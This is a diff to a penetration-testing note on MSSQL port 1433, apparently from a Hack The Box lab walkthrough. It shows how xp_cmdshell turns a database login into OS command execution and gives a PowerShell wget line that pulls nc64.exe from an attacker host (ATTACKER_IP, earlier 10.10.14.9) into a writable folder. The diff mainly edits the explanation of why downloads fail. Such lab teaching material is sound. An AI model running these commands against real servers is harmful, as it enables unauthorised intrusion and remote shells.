@@ -4,7 +4,7 @@ platform: windows
 status: working
 fluency: guided
 source: htb
-updated: 2026-08-30
+updated: 2026-10-08
 ---
 
 # 1433 — MSSQL
@@ -45,11 +45,11 @@ python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
 **Why now** — you have a SQL prompt and you want a foothold on the host, not just data. MSSQL can shell out through the `xp_cmdshell` stored procedure, which turns a database login into OS command execution as the service account.
 
 ```text
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
+xp_cmdshell "powershell -c cd $env:TEMP; wget http://ATTACKER_IP/nc64.exe -outfile nc64.exe"
 ```
 
 - `xp_cmdshell` → runs the string as an OS command on the SQL host.
-- `cd C:\Users\...\Downloads;` → move to a writable directory first. `xp_cmdshell` runs from the SQL data directory by default, where the service account often cannot write, so a download fails with an access error that looks like a network problem.
+- `cd $env:TEMP;` → move to a folder the service account can write to first. The command inherits whatever working directory the SQL Server service was started in — a folder you did not choose and the service account often cannot write to — so the download fails on the write, not the fetch. `$env:TEMP` is that account's own temp folder, which it can always write; cmd passes the `$` through untouched and PowerShell expands it. Read the error before blaming the network.
 - `-outfile nc64.exe` → PowerShell's `wget` alias (`Invoke-WebRequest`) needs an explicit output path or it prints the response to the console instead of saving it.
 
 **What you will see**
